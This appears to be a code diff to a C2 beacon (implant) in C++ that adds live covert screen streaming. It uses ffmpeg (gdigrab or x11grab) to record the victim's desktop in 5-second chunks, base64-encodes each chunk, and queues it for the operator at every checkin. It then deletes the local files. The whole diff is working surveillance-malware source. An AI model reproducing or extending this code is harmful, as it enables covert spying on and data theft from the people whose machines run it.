@@ -19,8 +19,40 @@
 #include <string>
 #include <cstdlib>
 #include <sstream>
+#include <mutex>
+#include <atomic>
+#include <vector>
 
 namespace media_screen {
+
+// ── Progressive stream queue (TRUE live) ────────────────────────────────────
+// record_screen_stream() records 5s chunks and pushes each into this queue as
+// soon as it completes; the beacon's main loop drains it every checkin and
+// sends the segments to the C2 one by one — so the operator sees the screen
+// WHILE it is being recorded, not at the end. (screen-record-live buffers
+// chunks for a later screen-dump; this path is for watching in real time.)
+namespace stream {
+inline std::mutex g_mu;
+inline std::vector<std::string> g_segments;
+inline std::atomic<bool> g_running{false};
+
+inline void push(const std::string& seg) {
+    std::lock_guard<std::mutex> lk(g_mu);
+    g_segments.push_back(seg);
+}
+
+inline std::vector<std::string> drain() {
+    std::lock_guard<std::mutex> lk(g_mu);
+    std::vector<std::string> out;
+    out.swap(g_segments);
+    return out;
+}
+
+inline int count() {
+    std::lock_guard<std::mutex> lk(g_mu);
+    return (int)g_segments.size();
+}
+} // namespace stream
 
 // ── Passive Mode: record then return file ───────────────────────────────────
 
@@ -209,6 +241,70 @@ inline std::string record_screen_live(int duration_seconds) {
 
     return "SCREEN_LIVE_ERROR: ffmpeg not available for live streaming\n";
 #endif
+}
+
+// ── Progressive stream: record 5s chunks, push each the moment it finishes ──
+// Runs until the operator issues `screen-stream-stop` (or `duration` seconds
+// elapse). Chunks are sent immediately via the queue; nothing is buffered
+// for a later dump (the C2 holds the live buffer).
+inline std::string record_screen_stream(int duration_seconds) {
+    if (duration_seconds <= 0) duration_seconds = 60;
+    std::string tmp_dir = media_utils::get_temp_path();
+    std::string tmp_base = media_utils::join_path(tmp_dir, "phantom_live_str");
+
+    std::string ffmpeg = media_utils::exec_cmd(
+#ifdef _WIN32
+        "where ffmpeg 2>nul"
+#else
+        "which ffmpeg 2>/dev/null"
+#endif
+    );
+    if (ffmpeg.empty()) {
+        return "SCREEN_STREAM_ERROR: ffmpeg not available for live streaming\n";
+    }
+
+    // wipe stale chunks from a previous stream session
+#ifdef _WIN32
+    system((std::string("del /q \"") + tmp_base + ".*\" >nul 2>nul").c_str());
+#else
+    system(("rm -f " + tmp_base + ".* 2>/dev/null").c_str());
+#endif
+
+    stream::g_running = true;
+    int made = 0, elapsed = 0;
+    while (stream::g_running && elapsed < duration_seconds) {
+        char chunk_path[512];
+        snprintf(chunk_path, sizeof(chunk_path), "%s.%03d", tmp_base.c_str(), made);
+        std::string chunk(chunk_path);
+#ifdef _WIN32
+        std::string cmd = "ffmpeg -f gdigrab -i desktop -t 5 -y " + chunk +
+                          " 2>nul";
+#else
+        std::string cmd = "ffmpeg -f x11grab -i :0.0 -t 5 -y " + chunk +
+                          " 2>/dev/null";
+#endif
+        int rc = system(cmd.c_str());
+        if (rc != 0 || !media_utils::file_exists(chunk)) break;
+        std::string b64 = media_utils::read_file_b64(chunk);
+        if (b64.size() >= 10 && b64.substr(0, 10) == "MEDIA_B64:")
+            b64 = b64.substr(10);
+        if (!b64.empty()) stream::push("SCREEN_LIVE_SEG:" + b64);
+        // chunk is sent; remove it (the C2 holds the live buffer)
+#ifdef _WIN32
+        DeleteFileA(chunk.c_str());
+#else
+        remove(chunk.c_str());
+#endif
+        ++made;
+        elapsed += 5;
+    }
+    stream::g_running = false;
+    return "screen streamed " + std::to_string(made) + " segment(s)";
+}
+
+inline std::string stop_screen_stream() {
+    stream::g_running = false;
+    return "screen-stream stop requested (final segment flushes)";
 }
 
 // ── Dump: retrieve buffered live recording ────────────────────────────────────
